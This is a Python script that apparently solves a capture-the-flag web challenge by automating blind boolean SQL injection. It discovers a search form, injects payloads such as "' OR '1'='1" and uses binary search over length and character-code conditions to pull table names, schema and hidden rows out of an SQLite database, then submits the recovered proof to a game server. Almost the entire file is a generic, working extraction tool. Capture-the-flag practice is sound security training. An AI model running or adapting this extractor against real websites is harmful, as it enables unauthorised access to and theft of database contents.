#!/usr/bin/env python3
"""Huntress CTF 2026 - Web Exploitation Day 03 "Query Me This" (blind SQLi).
Generic blind-boolean SQLi solver. The /lookup?q= search is `<col> LIKE '%q%'`
with UNION and comments filtered; a 4th row (visibility!='public') in the data
table hides the proof in a text column. truth(B) references only `id`, so it is
robust to randomised column/table names and ids.
Usage: webrun_sqli.py <challenge_id[/mode]> [--submit] [--rft]
"""
import sys, re, time, requests
sys.path.insert(0, "~/ctf")
from gm import GM

UA = {"User-Agent": "ctf-recon"}
PROOF = re.compile(r"proof_[0-9a-fA-F]{16,}")

def wait_ready(url):
    s = requests.Session(); s.headers.update(UA)
    for _ in range(40):
        try:
            r = s.get(url + "/", timeout=8)
            if r.status_code == 200 and "expired" not in r.text and "<form" in r.text:
                return s, r.text
        except Exception:
            pass
        time.sleep(2)
    return None, None

def find_form(home):
    m = re.search(r"<form[^>]*action='([^']+)'", home) or re.search(r'<form[^>]*action="([^"]+)"', home)
    action = m.group(1) if m else "/lookup"
    pm = re.search(r"<input[^>]*name='([^']+)'", home) or re.search(r'<input[^>]*name="([^"]+)"', home)
    param = pm.group(1) if pm else "q"
    return action, param

def solve(url):
    s, home = wait_ready(url)
    if not s:
        return None
    action, param = find_form(home)
    base = url.rstrip("/")
    def search(val):
        for _ in range(4):
            try:
                return s.get(base + action, params={param: val}, timeout=15).text
            except Exception:
                time.sleep(0.5)
        return ""
    # visible ids from a wildcard search
    allbody = search("%")
    vis = re.findall(r"Record ([0-9]+)", allbody)
    if not vis:
        # confirm injection/wildcard; fall back
        vis = re.findall(r"Record ([0-9]+)", search("' OR '1'='1"))
    anchor = vis[0] if vis else None
    if not anchor:
        return None
    def truth(B):
        # effective filter = (B) AND id=anchor ; trailing '1'='1 closed by wrapper %'
        q = "zxq%' OR ((" + B + ") AND id=" + anchor + ") OR '1'='1"
        return ("Record " + anchor) in search(q)
    def ext_len(expr):
        lo, hi = 0, 400
        while lo < hi:
            mid = (lo + hi) // 2
            if truth("length((%s))<=%d" % (expr, mid)): hi = mid
            else: lo = mid + 1
        return lo
    def ext(expr):
        n = ext_len(expr)
        out = []
        for i in range(1, n + 1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                if truth("unicode(substr((%s),%d,1))<=%d" % (expr, i, mid)): hi = mid
                else: lo = mid + 1
            out.append(chr(lo))
        return "".join(out)
    if not truth("1=1") or truth("1=2"):
        return None
    # data table = first non-sqlite table
    tbl = ext("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1")
    create = ext("SELECT sql FROM sqlite_master WHERE name='%s'" % tbl)
    cols = re.findall(r"(\w+)\s+(?:TEXT|VARCHAR|CHAR|CLOB)", create, re.I)
    notid = " AND ".join("id<>%s" % v for v in vis) or "1=1"
    concat = "||'~'||".join(cols) if cols else "title||'~'||summary"
    hidden = ext("SELECT %s FROM %s WHERE %s LIMIT 1" % (concat, tbl, notid))
    m = PROOF.search(hidden)
    print("   [%s] hidden='%s'" % (url[-16:], hidden), flush=True)
    return m.group(0) if m else None

def main():
    ch = sys.argv[1]
    # direct-URL debug mode: webrun_sqli.py --url <target_url>
    if ch == "--url":
        target = sys.argv[2]
        print("direct solve", target, "->", solve(target), flush=True)
        return
    do_submit = "--submit" in sys.argv[2:]
    rft = "--rft" in sys.argv[2:]
    g = GM()
    r = g.post({"op": "start", "challenge": ch, "run_for_time": rft})
    waited = 0
    while not r.get("targets") and waited < 60:
        time.sleep(4); waited += 4; r = g.status(ch)
    targets = {t["id"]: t["url"] for t in r.get("targets", [])}
    questions = r.get("questions", [])
    print("mode=%s deadline=%s targets=%d" % (r.get("mode"), r.get("deadline"), len(targets)), flush=True)
    answers = {}
    for q in questions:
        url = targets.get(q.get("artifact")) or (list(targets.values())[0] if targets else None)
        pf = solve(url) if url else None
        print("  %s -> %s" % (q["id"], pf), flush=True)
        if pf:
            answers[q["id"]] = pf
    print("recovered %d/%d" % (len(answers), len(questions)), flush=True)
    if do_submit and answers:
        res = g.submit(ch, answers)
        print("SUBMIT:", res.get("result"), "flag=" + str(res.get("flag")), flush=True)

if __name__ == "__main__":
    main()
